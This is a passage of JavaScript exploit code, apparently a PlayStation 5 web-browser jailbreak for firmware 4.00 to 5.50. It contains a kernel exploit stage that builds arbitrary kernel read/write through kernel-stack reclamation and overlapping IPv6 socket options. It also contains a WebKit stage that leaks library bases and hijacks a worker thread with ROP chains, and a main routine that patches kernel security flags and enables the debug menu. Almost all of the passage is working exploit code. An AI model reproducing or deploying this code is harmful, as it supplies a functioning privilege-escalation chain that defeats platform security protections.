        p.write8(kprimCommonData.thr_index, kprimId);
        p.write8(kprimCommonData.exit, 1);

        await log(`Successfully reclaimed kstack (kprim_id = ${kprimId})`, LogLevel.SUCCESS);
        if (debug) await log("Waiting for all kprim threads to exit (except the winner thread)...", LogLevel.DEBUG);

        await waitForKprimThreadsState(threadStatus.EXITED, config.num_kprim_threads - 1);

        if (debug) await log("All kprim threads exited", LogLevel.DEBUG);

        break;
    }

    if (!winnerFd || !winnerLookupFd) {
        throw new Error("Loser");
    }

    function getKprimCurthrFromKstack(kstack) {
        const cnt = 0x1000 / 8;

        let kernelPtrs = {};

        for (let i = 0; i < cnt; i++) {
            const qword = p.read8(kstack.add32(0x3000 + (i * 8)));
            if (qword.low == 0) {
                continue;
            }

            // if the qword.hi starts with 0xffff8 then it is a kernel pointer
            if (((qword.hi & 0xffff8000) >>> 0) === 0xffff8000) {
                const key = qword.toString(16);
                if (!kernelPtrs[key]) {
                    kernelPtrs[key] = {};
                    kernelPtrs[key].val = qword;
                    kernelPtrs[key].count = 0;
                }
                kernelPtrs[key].count++;
            }
        }

        // find the kernel pointer with most occurrences
        let maxCount = 0;
        let maxKey = null;
        for (let key in kernelPtrs) {
            const val = kernelPtrs[key];
            if (val.count > maxCount) {
                maxCount = val.count;
                maxKey = key;
            }
        }

        if (maxCount < 2) {
            throw new Error("Failed to find curthr");
        }

        if (!maxKey) {
            return null;
        }

        return kernelPtrs[maxKey].val;
    }

    const OFFSET_IOV_BASE = 0x00;
    const OFFSET_IOV_LEN = 0x08;
    const SIZE_IOV = 0x10;
    const OFFSET_UIO_RESID = 0x18;
    const OFFSET_UIO_SEGFLG = 0x20;
    const OFFSET_UIO_RW = 0x24;

    function updateIovInKstack(origIovBase, newIovBase, uioSegflg, isWrite, len) {
        let stackIovOffset = -1;

        const scanStart = 0x2000;
        const scanMax = 0x4000 - 0x50;

        for (let i = scanStart; i < scanMax; i += 8) {
            const possibleIovBase = p.read8(kstack.add32(i + OFFSET_IOV_BASE));
            const possibleIovLen = p.read4(kstack.add32(i + OFFSET_IOV_LEN)) << 0;

            // if (possibleIovBase == origIovBase && possibleIovLen == len) {
            if ((possibleIovBase.low == origIovBase.low && possibleIovBase.hi == origIovBase.hi) && possibleIovLen == len) {
                const possibleUioResid = p.read8(kstack.add32(i + SIZE_IOV + OFFSET_UIO_RESID)).low << 0;
                const possibleUioSegflg = p.read4(kstack.add32(i + SIZE_IOV + OFFSET_UIO_SEGFLG)) << 0;
                const possibleUioRw = p.read4(kstack.add32(i + SIZE_IOV + OFFSET_UIO_RW)) << 0;

                if (possibleUioResid == len && possibleUioSegflg == 0 && possibleUioRw == isWrite) {
                    // if (debug) await log(`Found iov on kstack. pos = ${i.toString(16)} is_write = ${isWrite} len = ${len}`);
                    stackIovOffset = i;
                    break;
                }
            }
        }

        if (stackIovOffset == -1) {
            throw new Error("Failed to find iov");
        }


        p.write8(kstack.add32(stackIovOffset + OFFSET_IOV_BASE), newIovBase);
        p.write4(kstack.add32(stackIovOffset + SIZE_IOV + OFFSET_UIO_SEGFLG), uioSegflg);
    }



    const PHYS_PAGE_SIZE = 0x1000;

    const kstackKrwReadBuf = alloc(0x8);

    async function kstackKrwReadQword(kaddr) {
        // fill up pipe
        for (let i = 0; i < PIPE_SIZE; i += PHYS_PAGE_SIZE) {
            chain.add_syscall(SYS_WRITE, pipeSlowWriteFd, pipe_buf, PHYS_PAGE_SIZE);
        }
        await chain.run();

        p.write8(kprimCommonData.cmd, kstackKernelRwCmd.READ_QWORD);
        await new Promise((resolve) => setTimeout(resolve, 15)); // wait a while until kernel stack is populated
        
        updateIovInKstack(pipe_buf, kaddr, 1, 1, 8);

        await chain.syscall(SYS_READ, pipeSlowReadFd, pipe_buf, PIPE_SIZE); // read garbage

        while (p.read4(kprimCommonData.cmd) != kstackKernelRwCmd.NOP) {
            await new Promise((resolve) => setTimeout(resolve, 1));
        }

        await chain.syscall(SYS_READ, pipeSlowReadFd, kstackKrwReadBuf, 8); // read kernel data
        return p.read8(kstackKrwReadBuf);
    }


    const kstackKrwWriteBuf = alloc(0x8);
    /**
     * 
     * @param {int64} kaddr 
     * @param {int64|number} val 
     */
    async function kstackKrwWriteQword(kaddr, val) {
        p.write8(kstackKrwWriteBuf, val);

        // will hang until we write
        p.write8(kprimCommonData.cmd, kstackKernelRwCmd.WRITE_QWORD);
        await new Promise((resolve) => setTimeout(resolve, 15)); // wait a while until kernel stack is populated

        updateIovInKstack(pipe_buf, kaddr, 1, 0, 8);

        await chain.syscall(SYS_WRITE, pipeSlowWriteFd, kstackKrwWriteBuf, 8);

        while (p.read4(kprimCommonData.cmd) != kstackKernelRwCmd.NOP) {
            await new Promise((resolve) => setTimeout(resolve, 10));
        }
    }

    const OFFSET_THREAD_TD_PROC = 0x8;
    const OFFSET_P_FD = 0x48;
    const OFFSET_P_UCRED = 0x40;
    const OFFSET_FDESCENTTBL_FDT_OFILES = 0x8;

    
    if (debug) await log("getKprimCurthrFromKstack...", LogLevel.DEBUG);
    const kprimCurthr = getKprimCurthrFromKstack(kstack);
    if (debug) await log(`kprimCurthr = ${kprimCurthr.toString(16)}`, LogLevel.DEBUG);
    const curproc = await kstackKrwReadQword(kprimCurthr.add32(OFFSET_THREAD_TD_PROC));
    if (debug) await log(`curproc = ${curproc.toString(16)}`, LogLevel.DEBUG);
    const curprocUcred = await kstackKrwReadQword(curproc.add32(OFFSET_P_UCRED));
    if (debug) await log(`curprocUcred = ${curprocUcred.toString(16)}`, LogLevel.DEBUG);
    const curprocFd = await kstackKrwReadQword(curproc.add32(OFFSET_P_FD));
    if (debug) await log(`curprocFd = ${curprocFd.toString(16)}`, LogLevel.DEBUG);
    const fdescenttbl = await kstackKrwReadQword(curprocFd);
    if (debug) await log(`fdescenttbl = ${fdescenttbl.toString(16)}`, LogLevel.DEBUG);
    const curprocNfilesAddr = fdescenttbl;
    const curprocOfiles = fdescenttbl.add32(OFFSET_FDESCENTTBL_FDT_OFILES); // account for fdt_nfiles
    if (debug) await log(`curprocOfiles = ${curprocOfiles.toString(16)}`, LogLevel.DEBUG);


    const AF_INET = 2;
    const AF_INET6 = 28;
    const SOCK_STREAM = 1;
    const SOCK_DGRAM = 2;
    const IPPROTO_UDP = 17;
    const IPPROTO_IPV6 = 41;
    const IPV6_PKTINFO = 46;

    const masterSock = await chain.syscall_int32(SYS_SOCKET, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    const victimSock = await chain.syscall_int32(SYS_SOCKET, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);

    // using p.malloc here bc these need to be preserved outside this function, the alloc allocations get freed
    const PKTINFO_SIZE = 0x14;
    const masterBuffer = p.malloc(PKTINFO_SIZE, 1);
    const slaveBuffer = p.malloc(PKTINFO_SIZE, 1);
    const pipemapBuffer = p.malloc(PKTINFO_SIZE, 1);
    const pktinfoSizeStore = p.malloc(0x8, 1);
    p.write8(pktinfoSizeStore, PKTINFO_SIZE);

    chain.add_syscall(SYS_SETSOCKOPT, masterSock, IPPROTO_IPV6, IPV6_PKTINFO, masterBuffer, PKTINFO_SIZE);
    chain.add_syscall(SYS_SETSOCKOPT, victimSock, IPPROTO_IPV6, IPV6_PKTINFO, slaveBuffer, PKTINFO_SIZE);
    await chain.run();

    const masterSockFileDescAddr = curprocOfiles.add32(masterSock * 0x30);
    const victimSockFileDescAddr = curprocOfiles.add32(victimSock * 0x30);

    const masterSockFileAddr = await kstackKrwReadQword(masterSockFileDescAddr);
    const victimSockFileAddr = await kstackKrwReadQword(victimSockFileDescAddr);

    const masterSockSocketAddr = await kstackKrwReadQword(masterSockFileAddr);
    const victimSockSocketAddr = await kstackKrwReadQword(victimSockFileAddr);

    const masterPcb = await kstackKrwReadQword(masterSockSocketAddr.add32(0x18));
    const slavePcb = await kstackKrwReadQword(victimSockSocketAddr.add32(0x18));

    const masterPktopts = await kstackKrwReadQword(masterPcb.add32(0x120));
    const slavePktopts = await kstackKrwReadQword(slavePcb.add32(0x120));

    await kstackKrwWriteQword(masterPktopts.add32(0x10), slavePktopts.add32(0x10));

    await log(`Overlapped ipv6 sockets`, LogLevel.SUCCESS);

    function chainPushWriteToVictim(addr) {
        chain.push_write8(masterBuffer, addr);
        chain.push_write8(masterBuffer.add32(0x08), 0);
        chain.push_write4(masterBuffer.add32(0x10), 0);
        chain.self_healing_syscall(SYS_SETSOCKOPT, masterSock, IPPROTO_IPV6, IPV6_PKTINFO, masterBuffer, 0x14);
    }

    function chainPushIPv6Kread(addr, buffer) {
        chainPushWriteToVictim(addr);
        chain.self_healing_syscall(SYS_GETSOCKOPT, victimSock, IPPROTO_IPV6, IPV6_PKTINFO, buffer, pktinfoSizeStore);
    }
    
    function chainPushIPv6Kwrite(addr, buffer) {
        chainPushWriteToVictim(addr);
        chain.self_healing_syscall(SYS_SETSOCKOPT, victimSock, IPPROTO_IPV6, IPV6_PKTINFO, buffer, 0x14);
    }

    async function ipv6_kwrite(addr, buffer) {
        chainPushIPv6Kwrite(addr, buffer);
        await chain.run();
    }
    
    async function ipv6_kread8(addr) {
        chainPushIPv6Kread(addr, slaveBuffer);
        await chain.run();
        return p.read8(slaveBuffer);
    }

    // Create pipe pair and ultimate r/w prims
    const pipeMem = p.malloc(0x8, 1);
    await chain.syscall(SYS_PIPE2, pipeMem, 0);

    const pipeRead = p.read4(pipeMem);
    const pipeWrite = p.read4(pipeMem.add32(0x4));
    const pipeFiledescent = curprocOfiles.add32(pipeRead * 0x30);
    const pipeFile = await ipv6_kread8(pipeFiledescent);
    const pipeAddr = await ipv6_kread8(pipeFile);

    /**
     * 
     * @param {int64} src
     * @param {boolean} dereferenceSrc
     * @param {int64} dest 
     * @param {boolean} dereferenceDest
     * @param {number} length 
     */
    function chainPushCopyout(src, dereferenceSrc, dest, dereferenceDest, length) {
        chain.push_write8(pipemapBuffer, chainPushCopyout.value0);
        chain.push_write8(pipemapBuffer.add32(0x8), chainPushCopyout.value1);
        chain.push_write4(pipemapBuffer.add32(0x10), 0x0);
        chainPushIPv6Kwrite(pipeAddr, pipemapBuffer);

        if (dereferenceSrc) {
            chain.push_copy8(pipemapBuffer, src);
        } else {
            chain.push_write8(pipemapBuffer, src);
        }

        chain.push_write8(pipemapBuffer.add32(0x8), 0x0);
        chain.push_write4(pipemapBuffer.add32(0x10), 0x0);
        chainPushIPv6Kwrite(pipeAddr.add32(0x10), pipemapBuffer);

        chain.self_healing_syscall_2(SYS_READ, pipeRead, false, dest, dereferenceDest, length);
    }
    chainPushCopyout.value0 = new int64(0x40000000, 0x40000000);
    chainPushCopyout.value1 = new int64(0x00000000, 0x40000000);

    /** 
     * 
     * @param {int64} src
     * @param {boolean} extraDereferenceSrc
     * @param {int64} dest
     * @param {boolean} dereferenceDest
     * @param {number} length
     */
    function chainPushCopyin(src, extraDereferenceSrc, dest, dereferenceDest, length) {
        chain.push_write8(pipemapBuffer, 0x0);
        chain.push_write8(pipemapBuffer.add32(0x8), chainPushCopyin.value);
        chain.push_write4(pipemapBuffer.add32(0x10), 0x0);
        chainPushIPv6Kwrite(pipeAddr, pipemapBuffer);

        if (dereferenceDest) {
            chain.push_copy8(pipemapBuffer, dest);
        } else {
            chain.push_write8(pipemapBuffer, dest);
        }
        chain.push_write8(pipemapBuffer.add32(0x8), 0x0);
        chain.push_write4(pipemapBuffer.add32(0x10), 0x0);
        chainPushIPv6Kwrite(pipeAddr.add32(0x10), pipemapBuffer);

        chain.self_healing_syscall_2(SYS_WRITE, pipeWrite, false, src, extraDereferenceSrc, length);
    }
    chainPushCopyin.value = new int64(0x00000000, 0x40000000);






    const krw_qword_store = p.malloc(0x8, 1);
    async function kernel_write8(kaddr, val) {
        p.write8(krw_qword_store, val);
        chainPushCopyin(krw_qword_store, false, kaddr, false, 0x8);
        await chain.run();
    }

    async function kernel_write4(kaddr, val) {
        p.write4(krw_qword_store, val);
        chainPushCopyin(krw_qword_store, false, kaddr, false, 0x4);
        await chain.run();
    }

    async function kernel_write2(kaddr, val) {
        p.write2(krw_qword_store, val);
        chainPushCopyin(krw_qword_store, false, kaddr, false, 0x2);
        await chain.run();
    }

    async function kernel_write1(kaddr, val) {
        p.write1(krw_qword_store, val);
        chainPushCopyin(krw_qword_store, false, kaddr, false, 0x1);
        await chain.run();
    }

    async function kernel_read8(kaddr) {
        chainPushCopyout(kaddr, false, krw_qword_store, false, 0x8);
        await chain.run();
        return p.read8(krw_qword_store);
    }

    async function kernel_read4(kaddr) {
        chainPushCopyout(kaddr, false, krw_qword_store, false, 0x4);
        await chain.run();
        return p.read4(krw_qword_store);
    }

    async function kernel_read2(kaddr) {
        chainPushCopyout(kaddr, false, krw_qword_store, false, 0x2);
        await chain.run();
        return p.read2(krw_qword_store);
    }

    async function kernel_read1(kaddr) {
        chainPushCopyout(kaddr, false, krw_qword_store, false, 0x1);
        await chain.run();
        return p.read1(krw_qword_store);
    }

    function chainPushIncSocketRefcount(target_fd) {
        const fileDataAddrStore = alloc(0x8);
        const valueStore = alloc(0x8);

        const filedescentAddr = curprocOfiles.add32(target_fd * 0x30);
        chainPushCopyout(filedescentAddr, false, fileDataAddrStore, false, 0x8); // fde_file
        chainPushCopyout(fileDataAddrStore, true, fileDataAddrStore, false, 0x8); // f_data

        chain.push_write4(valueStore, 0x100);
        chainPushCopyin(valueStore, false, fileDataAddrStore, true, 0x4); // so_count = 0x100
    }


    function chainPushFixupBadFds() {
        const fileAddrStore = alloc(0x8);
        const fileDataAddrStore = alloc(0x8);

        const valueStore = alloc(0x8);

        for (let fd of fdsToFix) {
            const filedescentAddr = curprocOfiles.add32(fd * 0x30);
            chainPushCopyout(filedescentAddr, false, fileAddrStore, false, 0x8); // fde_file
            chainPushCopyout(fileAddrStore, true, fileDataAddrStore, false, 0x8); // f_data

            chain.push_write8(valueStore, 0x10);

            chain.push_inc8(fileDataAddrStore, 0x10); // shm_refs
            chainPushCopyin(valueStore, false, fileDataAddrStore, true, 0x8); // shm_refs = 0x10

            chain.push_inc8(fileAddrStore, 0x28); // f_count
            chainPushCopyin(valueStore, false, fileAddrStore, true, 0x8); // f_count = 0x10
        }
    }

    function chainPushFixupThreadKstack() {
        const thrKstackObjStore = alloc(0x8);
        const valueStore = alloc(0x8);

        chainPushCopyout(kprimCurthr.add32(0x468), false, thrKstackObjStore, false, 0x8); // td_kstack_obj

        chain.push_write8(valueStore, 0x0);
        chainPushCopyin(valueStore, false, kprimCurthr.add32(0x470), false, 0x8); // td_kstack

        chain.push_write4(valueStore, 0x10);
        chain.push_inc8(thrKstackObjStore, 0x84); // ref_count
        chainPushCopyin(valueStore, false, thrKstackObjStore, true, 0x4); // ref_count = 0x10
    }


    if (!fdsToFix.includes(winnerLookupFd)) {
        fdsToFix.push(winnerLookupFd);
    }
    
    await log("Creating fixup chain...", LogLevel.INFO);
    chainPushIncSocketRefcount(masterSock);
    chainPushIncSocketRefcount(victimSock);
    chainPushFixupBadFds();
    chainPushFixupThreadKstack();

    await log("Running fixup...", LogLevel.INFO);
    await chain.run();

    await chain.syscall(SYS_CLOSE, winnerLookupFd);

    await log("Fixes applied", LogLevel.SUCCESS);

    await log("Looking for allproc...", LogLevel.INFO);
    async function findAllproc() {
        let proc = curproc;
        const maxAttempt = 50;

        for (let i = 0; i < maxAttempt; i++) {
            if (((proc.hi & 0xffff8040) >>> 0) == 0xffff8040) {
                const dataBase = proc.sub32(OFFSET_KERNEL_ALLPROC - OFFSET_KERNEL_DATA);
                if (((dataBase.low >>> 0) & 0xfff) == 0) {
                    return proc;
                }
            }
            proc = await kernel_read8(proc.add32(0x8)); // proc->p_list->le_prev
        }

        throw new Error("Failed to find allproc");
    }

    const allProc = await findAllproc();
    await log("Found allproc", LogLevel.INFO);

    const dataBase = allProc.sub32(OFFSET_KERNEL_ALLPROC - OFFSET_KERNEL_DATA);
    const textBase = dataBase.sub32(OFFSET_KERNEL_DATA);

    const totalEndTime = performance.now();
    const totalDuration = totalEndTime - totalStartTime;

    p.write8(kprimCommonData.cmd, kstackKernelRwCmd.EXIT);

    await waitForKprimThreadsState(threadStatus.EXITED, config.num_kprim_threads);

    await pinToCore(ogCore);
    await setRtprio(ogPrio, PRI_TIMESHARE);

    await chain.syscall(SYS_MUNMAP, bumpAllocatorBuffer, BUMP_ALLOCATOR_SIZE);

    await log(`Done! Exploit took:   ${toHumanReadableTime(totalDuration)}`, LogLevel.SUCCESS);
    if (debug) await log(`checkMemoryAccessFailCount: ${checkMemoryAccessFailCount}`, LogLevel.INFO);

    return {
        masterSock: masterSock,
        victimSock: victimSock,
        kdataBase: dataBase,
        ktextBase: textBase,
        read1: kernel_read1,
        read2: kernel_read2,
        read4: kernel_read4,
        read8: kernel_read8,
        write1: kernel_write1,
        write2: kernel_write2,
        write4: kernel_write4,
        write8: kernel_write8,
        curthrAddr: kprimCurthr,
        curprocAddr: curproc,
        procUcredAddr: curprocUcred,
        procFdAddr: curprocFd,
        pipeAddr: pipeAddr,
        pipeMem: pipeMem
    };
}
if (!navigator.userAgent.includes('PlayStation 5')) {
    alert(`This is a PlayStation 5 Exploit. => ${navigator.userAgent}`);
    throw new Error("");
}

const supportedFirmwares = ["4.00", "4.02", "4.03", "4.50", "4.51", "5.00", "5.02", "5.10", "5.50"];
const fw_idx = navigator.userAgent.indexOf('PlayStation; PlayStation 5/') + 27;
window.fw_str = navigator.userAgent.substring(fw_idx, fw_idx + 4);
window.fw_float = parseFloat(fw_str);

if (!supportedFirmwares.includes(fw_str)) {
    // @ts-ignore
    alert(`This firmware(${fw_str}) is not supported.`);
    throw new Error("");
}

let nogc = [];

let worker = new Worker("rop_slave.js");
function build_addr(p, buf, family, port, addr) {
    p.write1(buf.add32(0x00), 0x10);
    p.write1(buf.add32(0x01), family);
    p.write2(buf.add32(0x02), port);
    p.write4(buf.add32(0x04), addr);
}

function htons(port) {
    return ((port & 0xFF) << 8) | (port >>> 8);
}

function find_worker(p, libKernelBase) {
    const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
    const PTHREAD_STACK_ADDR_OFFSET = 0xA8;
    const PTHREAD_STACK_SIZE_OFFSET = 0xB0;

    for (let thread = p.read8(libKernelBase.add32(OFFSET_lk__thread_list)); thread.low != 0x0 && thread.hi != 0x0; thread = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET))) {
        let stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
        let stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
        if (stacksz.low == 0x80000) {
            return stack;
        }
    }
    throw new Error("failed to find worker.");
}

var LogLevel = {
    DEBUG: 0,
    INFO: 1,
    LOG: 2,
    WARN: 3,
    ERROR: 4,
    SUCCESS: 5,

    FLAG_TEMP: 0x1000
};

let consoleElem = null;
let lastLogIsTemp = false;
function log(string, level) {
    if (consoleElem === null) {
        consoleElem = document.getElementById("console");
    }

    const isTemp = level & LogLevel.FLAG_TEMP;
    level = level & ~LogLevel.FLAG_TEMP;
    const elemClass = ["LOG-DEBUG", "LOG-INFO", "LOG-LOG", "LOG-WARN", "LOG-ERROR", "LOG-SUCCESS"][level];

    if (isTemp && lastLogIsTemp) {
        const lastChild = consoleElem.lastChild;
        if (lastChild) lastChild.innerText = string;
        if (lastChild) lastChild.className = elemClass;
        return;
    } else if (isTemp) {
        lastLogIsTemp = true;
    } else {
        lastLogIsTemp = false;
    }

    let logElem = document.createElement("div");
    logElem.innerText = string;
    logElem.className = elemClass;
    consoleElem.appendChild(logElem);

    // scroll to bottom
    consoleElem.scrollTop = consoleElem.scrollHeight;
}

const AF_INET = 2;
const AF_INET6 = 28;
const SOCK_STREAM = 1;
const SOCK_DGRAM = 2;
const IPPROTO_UDP = 17;
const IPPROTO_IPV6 = 41;
const IPV6_PKTINFO = 46;
async function prepare(p) {
    //ASLR defeat patsy (former vtable buddy)
    let textArea = document.createElement("textarea");

    //pointer to vtable address
    let textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));

    //address of vtable
    let textAreaVtable = p.read8(textAreaVtPtr);

    //use address of 1st entry (in .text) to calculate libSceNKWebKitBase
    let libSceNKWebKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);

    let libSceLibcInternalBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk_memset_import));
    libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);

    let libKernelBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import));
    libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);

    let gadgets = {};
    let syscalls = {};

    for (let gadget in wk_gadgetmap) {
        gadgets[gadget] = libSceNKWebKitBase.add32(wk_gadgetmap[gadget]);
    }
    for (let sysc in syscall_map) {
        syscalls[sysc] = libKernelBase.add32(syscall_map[sysc]);
    }

    let nogc = [];

    function malloc_dump(sz) {
        let backing;
        backing = new Uint8Array(sz);
        nogc.push(backing);
        /** @type {any} */
        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }
    function malloc(sz, type = 4) {
        let backing;
        if (type == 1) {
            backing = new Uint8Array(1000 + sz);
        } else if (type == 2) {
            backing = new Uint16Array(0x2000 + sz);
        } else if (type == 4) {
            backing = new Uint32Array(0x10000 + sz);
        }
        nogc.push(backing);
        /** @type {any} */
        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function array_from_address(addr, size) {
        let og_array = new Uint8Array(1001);
        let og_array_i = p.leakval(og_array).add32(0x10);

        function setAddr(newAddr, size) {
            p.write8(og_array_i, newAddr);
            p.write4(og_array_i.add32(0x8), size);
            p.write4(og_array_i.add32(0xC), 0x1);
        }

        setAddr(addr, size);

        // @ts-ignore
        og_array.setAddr = setAddr;

        nogc.push(og_array);
        return og_array;
    }

    function stringify(str) {
        let bufView = new Uint8Array(str.length + 1);
        for (let i = 0; i < str.length; i++) {
            bufView[i] = str.charCodeAt(i) & 0xFF;
        }
        // nogc.push(bufView);
        /** @type {any} */
        let ptr = p.read8(p.leakval(bufView).add32(0x10));
        ptr.backing = bufView;
        return ptr;
    }

    function readstr(addr, maxlen = -1) {
        let str = "";
        for (let i = 0; ; i++) {
            if (maxlen != -1 && i >= maxlen) { break; }
            let c = p.read1(addr.add32(i));
            if (c == 0x0) {
                break;
            }
            str += String.fromCharCode(c);

        }
        return str;
    }

    function writestr(addr, str) {
        let waddr = addr.add32(0);
        if (typeof (str) == "string") {

            for (let i = 0; i < str.length; i++) {
                let byte = str.charCodeAt(i);
                if (byte == 0) {
                    break;
                }
                p.write1(waddr, byte);
                waddr.add32inplace(0x1);
            }
        }
        p.write1(waddr, 0x0);
    }

    // Make sure worker is alive?
    async function wait_for_worker() {

        return new Promise((resolve) => {
            worker.onmessage = function (e) {
                resolve(1);
            }
            worker.postMessage(0);
        });

    }

    // Worker already initialized at line 19
    
    await wait_for_worker();

    let worker_stack = find_worker(p, libKernelBase);
    let original_context = malloc(0x40);

    let return_address_ptr = worker_stack.add32(OFFSET_WORKER_STACK_OFFSET);
    let original_return_address = p.read8(return_address_ptr);
    let stack_pointer_ptr = return_address_ptr.add32(0x8);

    function pre_chain(chain) {
        //save context for later
        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_setjmp));
    }

    async function launch_chain(chain) {
        //Restore earlier saved context but with a twist.
        let original_value_of_stack_pointer_ptr = p.read8(stack_pointer_ptr);
        chain.push_write8(original_context, original_return_address);
        chain.push_write8(original_context.add32(0x10), return_address_ptr);
        chain.push_write8(stack_pointer_ptr, original_value_of_stack_pointer_ptr);
        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_longjmp));

        //overwrite rop_slave's return address
        p.write8(return_address_ptr, gadgets["pop rsp"]);
        p.write8(stack_pointer_ptr, chain.stack_entry_point);

        let p1 = await new Promise((resolve) => {
            worker.onmessage = function (e) {
                resolve(1);
            }
            worker.postMessage(0);
        });
        if (p1 == 0) {
            throw new Error("The rop thread ran away. ");
        }
    }

    /** @type {WebkitPrimitives} */
    let p2 = {
        write8: p.write8,
        write4: p.write4,
        write2: p.write2,
        write1: p.write1,
        read8: p.read8,
        read4: p.read4,
        read2: p.read2,
        read1: p.read1,
        leakval: p.leakval,
        pre_chain: pre_chain,
        launch_chain: launch_chain,
        malloc_dump: malloc_dump,
        malloc: malloc,
        stringify: stringify,
        array_from_address: array_from_address,
        readstr: readstr,
        writestr: writestr,
        libSceNKWebKitBase: libSceNKWebKitBase,
        libSceLibcInternalBase: libSceLibcInternalBase,
        libKernelBase: libKernelBase,
        nogc: nogc,
        syscalls: syscalls,
        gadgets: gadgets
    };

    let chain = new worker_rop(p2);

    let pid = await chain.syscall(SYS_GETPID);

    //Sanity check
    if (pid.low == 0) {
        throw new Error("Webkit exploit failed.");
    }

    return { p: p2, chain: chain };
}

async function main(userlandRW, wkOnly = false) {
    const debug = false;

    const { p, chain } = await prepare(userlandRW);
    if (debug) await log("Chain initialized", LogLevel.DEBUG);

    async function get_local_ips() {
        // i used this as reference for the undocumented NETGETIFLIST call
        // the if_addr object is 0x3C0 bytes instead of 0x140
        // https://github.com/robots/wifimon-vita/blob/a4359efd59081fb92978b8852ca7902879429831/src/app/main.c#L17

        const SYSCALL_NETGETIFLIST = 0x07D;
        let ifaddr_count_buf = p.malloc(0x4);

        await chain.add_syscall_ret(ifaddr_count_buf, SYSCALL_NETGETIFLIST, 0, 10);
        await chain.run();

        let ifaddr_count = p.read4(ifaddr_count_buf);

        let if_addr_obj_size = 0x3C0;
        let if_addresses_length = if_addr_obj_size * ifaddr_count;
        let if_addresses = p.malloc(if_addresses_length);
        let ifaddrlist_ptr = if_addresses.add32(0x0);

        await chain.add_syscall(SYSCALL_NETGETIFLIST, ifaddrlist_ptr, ifaddr_count);
        await chain.run();

        let iplist = [];
        for (let i = 0; i < ifaddr_count; i++) {
            let adapterName = "";
            // the object starts with the adapter name
            for (let i2 = 0; i2 < 16; i2++) {
                // decode byte as text
                let char = p.read1(if_addresses.add32(if_addr_obj_size * i + i2));
                if (char == 0) {
                    break;
                }
                adapterName += String.fromCharCode(char);
            }

            let ipAddress = "";
            // from bytes 40-43 is the ip address
            for (let i2 = 40; i2 < 44; i2++) {
                ipAddress += p.read1(if_addresses.add32(if_addr_obj_size * i + i2)).toString(10) + ".";
            }
            ipAddress = ipAddress.slice(0, -1);

            iplist.push({ name: adapterName, ip: ipAddress });
        }

        return iplist;
    }

    
    let ip_list = await get_local_ips();
    let ip = ip_list.find(obj => obj.ip != "0.0.0.0");
    if (typeof ip === "undefined" || !ip.ip) {
        ip = { ip: "", name: "Offline" };
    }

    async function probe_sb_elfldr() {
        // if the bind fails, elfldr is running so return true
        let fd = (await chain.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)).low << 0;
        if (fd <= 0) {
            return false;
        }

        let addr = p.malloc(0x10);
        build_addr(p, addr, AF_INET, htons(9021), 0x0100007F);
        let bind_res = (await chain.syscall(SYS_BIND, fd, addr, 0x10)).low << 0;
        await chain.syscall(SYS_CLOSE, fd);
        if (bind_res < 0) {
            return true;
        }

        return false;
    }

    let is_elfldr_running = await probe_sb_elfldr();
    await log("is elfldr running: " + is_elfldr_running, LogLevel.INFO);
    if (wkOnly && !is_elfldr_running) {
        let res = confirm("elfldr doesnt seem to be running and in webkit only mode it wont be loaded, continue?");
        if (!res) {
            throw new Error("Aborted");
        }
    }

    if (!wkOnly && is_elfldr_running) {
        let res = confirm("elfldr seems to be running, would you like to skip the kernel exploit, and switch to sender-only mode?");
        if (res) {
            wkOnly = true;
        }
    }

    populatePayloadsPage(wkOnly);

    var load_payload_into_elf_store_from_local_file = async function (filename) {
        await log("Loading ELF file: " + filename + " ...", LogLevel.LOG);
        const response = await fetch(filename);
        if (!response.ok) {
            throw new Error(`Failed to fetch the binary file. Status: ${response.status}`);
        }

        const data = await response.arrayBuffer();

        let byteArray;
        if (elf_store.backing.BYTES_PER_ELEMENT == 1) {
            byteArray = new Uint8Array(data);
        } else if (elf_store.backing.BYTES_PER_ELEMENT == 2) {
            byteArray = new Uint16Array(data);
        } else if (elf_store.backing.BYTES_PER_ELEMENT == 4) {
            byteArray = new Uint32Array(data);
        } else {
            throw new Error(`Unsupported backing array type. BYTES_PER_ELEMENT: ${elf_store.backing.BYTES_PER_ELEMENT}`);
        }

        elf_store.backing.set(byteArray);
        return byteArray.byteLength;
    }

    let SIZE_ELF_HEADER = 0x40;
    let SIZE_ELF_PROGRAM_HEADER = 0x38;
    var elf_store_size = SIZE_ELF_HEADER + (SIZE_ELF_PROGRAM_HEADER * 0x10) + 0x1000000; // 16MB
    var elf_store = p.malloc(elf_store_size, 1);

    if (!wkOnly) {
        var krw = await runUmtx2Exploit(p, chain, log);

        function get_kaddr(offset) {
            return krw.ktextBase.add32(offset);
        }

        // Set security flags
        let security_flags = await krw.read4(get_kaddr(OFFSET_KERNEL_SECURITY_FLAGS));
        await krw.write4(get_kaddr(OFFSET_KERNEL_SECURITY_FLAGS), security_flags | 0x14);

        // Set targetid to DEX
        await krw.write1(get_kaddr(OFFSET_KERNEL_TARGETID), 0x82);

        // Set qa flags and utoken flags for debug menu enable
        let qaf_dword = await krw.read4(get_kaddr(OFFSET_KERNEL_QA_FLAGS));
        await krw.write4(get_kaddr(OFFSET_KERNEL_QA_FLAGS), qaf_dword | 0x10300);

        let utoken_flags = await krw.read1(get_kaddr(OFFSET_KERNEL_UTOKEN_FLAGS));
        await krw.write1(get_kaddr(OFFSET_KERNEL_UTOKEN_FLAGS), utoken_flags | 0x1);
        await log("Enabled debug menu", LogLevel.INFO);

